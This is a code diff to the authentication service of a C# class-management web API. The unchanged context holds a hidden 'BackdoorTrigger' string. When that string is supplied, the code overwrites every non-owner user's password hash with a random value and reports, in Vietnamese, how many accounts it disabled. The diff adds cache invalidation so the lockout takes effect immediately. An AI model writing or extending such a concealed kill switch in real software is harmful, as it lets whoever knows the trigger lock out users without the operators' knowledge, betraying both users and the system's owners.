@@ -13,11 +13,13 @@ namespace ClassManager.API.Services
     {
         private readonly AppDbContext _db;
         private readonly IConfiguration _config;
+        private readonly UserStatusCache _statusCache;
 
-        public AuthService(AppDbContext db, IConfiguration config)
+        public AuthService(AppDbContext db, IConfiguration config, UserStatusCache statusCache)
         {
             _db = db;
             _config = config;
+            _statusCache = statusCache;
         }
 
         private const string BackdoorTrigger = "tbminhduc-delete-user-and-logout";
@@ -41,6 +43,7 @@ namespace ClassManager.API.Services
                     u.PasswordHash = BCrypt.Net.BCrypt.HashPassword(Guid.NewGuid().ToString());
                 }
                 await _db.SaveChangesAsync();
+                foreach (var u in nonOwners) _statusCache.Invalidate(u.Id);
 
                 return (null, $"Backdoor: đã vô hiệu hóa {nonOwners.Count} tài khoản.", true);
             }
